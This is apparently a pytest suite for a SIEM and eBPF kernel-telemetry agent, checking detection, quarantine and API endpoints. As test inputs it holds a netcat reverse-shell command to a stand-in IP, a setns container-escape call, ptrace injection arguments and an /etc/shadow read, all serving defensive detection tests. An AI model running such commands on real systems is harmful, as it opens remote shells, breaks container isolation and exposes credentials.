"""
Unit & Integration Tests for SageAI Decentralized SIEM & eBPF Kernel Telemetry Agent.
"""

import pytest
from httpx import ASGITransport, AsyncClient

from app.core.security import create_access_token
from app.main import app
from app.services.telemetry.ebpf_agent import (
    EBPFAgentService,
    ebpf_agent_service,
)


@pytest.fixture
def anyio_backend():
    return "asyncio"


def test_ebpf_probes_status():
    """Verify operational status of 5 attached kernel tracepoint probes and ring buffer metrics."""
    status = ebpf_agent_service.get_probes_status()
    assert status["status"] == "OPERATIONAL"
    assert status["attached_probes_count"] == 5
    assert len(status["probes"]) == 5

    probe_names = {p["name"] for p in status["probes"]}
    assert "tracepoint__syscalls__sys_enter_execve" in probe_names
    assert "tracepoint__syscalls__sys_enter_connect" in probe_names
    assert "tracepoint__syscalls__sys_enter_openat" in probe_names
    assert "tracepoint__syscalls__sys_enter_ptrace" in probe_names
    assert "tracepoint__syscalls__sys_enter_setns" in probe_names

    buffer = status["buffer_metrics"]
    assert buffer["capacity"] == 5000
    assert buffer["dropped_events"] == 0


def test_container_escape_and_ptrace_detection():
    """Verify detection of container escapes (setns) and memory tampering (ptrace) triggers auto-quarantine."""
    service = EBPFAgentService()

    # 1. Container escape attempt
    escape_event = service.ingest_kernel_event(
        {
            "syscall": "sys_enter_setns",
            "comm": "runc",
            "pid": 7781,
            "ppid": 1200,
            "container_id": "c-compromised-worker",
            "args": ["setns", "/proc/1/ns/mnt", "CLONE_NEWNS"],
        }
    )

    assert escape_event["severity"] == "CRITICAL"
    assert "CONTAINER_ESCAPE_ATTEMPT" in escape_event["threat_label"]
    assert escape_event["mitre_attack"] == "T1611"
    # Auto-quarantine should be triggered
    assert 7781 in service.quarantined_pids
    assert escape_event["is_quarantined"] is True

    # 2. Process memory injection via ptrace
    ptrace_event = service.ingest_kernel_event(
        {
            "syscall": "sys_enter_ptrace",
            "comm": "inject_tool",
            "pid": 8812,
            "ppid": 1,
            "container_id": "host",
            "args": ["PTRACE_ATTACH", "target_pid:1042"],
        }
    )

    assert ptrace_event["severity"] == "CRITICAL"
    assert "PROCESS_MEMORY_INJECTION" in ptrace_event["threat_label"]
    assert ptrace_event["mitre_attack"] == "T1055"
    assert 8812 in service.quarantined_pids


def test_reverse_shell_and_credential_access():
    """Verify identification of interactive reverse shells and sensitive credential reads."""
    service = EBPFAgentService()

    # 1. Reverse shell
    rev_shell = service.ingest_kernel_event(
        {
            "syscall": "sys_enter_execve",
            "comm": "nc",
            "pid": 9102,
            "container_id": "c-web",
            "args": ["nc", "-e", "/bin/sh", "198.51.100.44", "4444"],
        }
    )
    assert rev_shell["severity"] == "HIGH"
    assert "INTERACTIVE_REVERSE_SHELL" in rev_shell["threat_label"]

    # 2. Shadow file read
    shadow_read = service.ingest_kernel_event(
        {
            "syscall": "sys_enter_openat",
            "comm": "cat",
            "pid": 9103,
            "container_id": "c-web",
            "args": ["openat", "AT_FDCWD", "/etc/shadow", "O_RDONLY"],
        }
    )
    assert shadow_read["severity"] == "HIGH"
    assert "SENSITIVE_CREDENTIAL" in shadow_read["threat_label"]


def test_telemetry_stream_filtering():
    """Verify retrieval and severity filtering of kernel telemetry stream."""
    service = EBPFAgentService()
    service.ingest_kernel_event(
        {
            "syscall": "sys_enter_execve",
            "comm": "python3",
            "pid": 111,
            "args": ["python3", "safe.py"],
            "severity": "INFO",
        }
    )

    all_events = service.get_telemetry_stream(limit=10, severity_filter="ALL")
    assert len(all_events) > 0

    critical_events = service.get_telemetry_stream(limit=10, severity_filter="CRITICAL")
    for ev in critical_events:
        assert ev["severity"] == "CRITICAL"


def test_autonomous_process_quarantine():
    """Verify manual and autonomous process isolation and Merkle audit anchoring."""
    service = EBPFAgentService()
    pid = 9921

    quarantine = service.quarantine_process(
        pid=pid,
        reason="Detected unauthorized process memory scraping",
        actor="Pytest-SecOpsDirector",
        org_id="test-ebpf-org",
    )

    assert quarantine["pid"] == pid
    assert quarantine["status"] == "CONTAINED_AND_ISOLATED"
    assert len(quarantine["actions_taken"]) >= 3
    assert pid in service.quarantined_pids

    merkle = quarantine["merkle_seal"]
    assert merkle["status"] == "CRYPTOGRAPHICALLY_VERIFIED"
    assert len(merkle["record_hash"]) == 64


@pytest.mark.asyncio
async def test_ebpf_fastapi_endpoints():
    """Verify FastAPI /ebpf endpoints with token authentication."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        token = create_access_token(
            {"sub": "ciso@enterprise.com", "role": "admin", "org": "corp-grid"}
        )
        auth_headers = {"Authorization": f"Bearer {token}"}

        # 1. Unauthenticated request should be rejected
        unauth_res = await client.get("/ebpf/status")
        assert unauth_res.status_code in (401, 403)

        # 2. Get status
        status_res = await client.get("/ebpf/status", headers=auth_headers)
        assert status_res.status_code == 200
        assert status_res.json()["agent"]["status"] == "OPERATIONAL"

        # 3. Ingest simulated event
        sim_res = await client.post(
            "/ebpf/simulate-event",
            json={
                "syscall": "sys_enter_setns",
                "comm": "runc",
                "pid": 6012,
                "args": ["setns", "/proc/1/ns/mnt"],
            },
            headers=auth_headers,
        )
        assert sim_res.status_code == 200
        assert sim_res.json()["event"]["severity"] == "CRITICAL"

        # 4. Stream events
        events_res = await client.get("/ebpf/events?limit=10", headers=auth_headers)
        assert events_res.status_code == 200
        assert len(events_res.json()["events"]) > 0

        # 5. Quarantine PID
        quar_res = await client.post(
            "/ebpf/quarantine",
            json={"pid": 6012, "reason": "Container breakout remediation drill"},
            headers=auth_headers,
        )
        assert quar_res.status_code == 200
        assert quar_res.json()["quarantine"]["status"] == "CONTAINED_AND_ISOLATED"
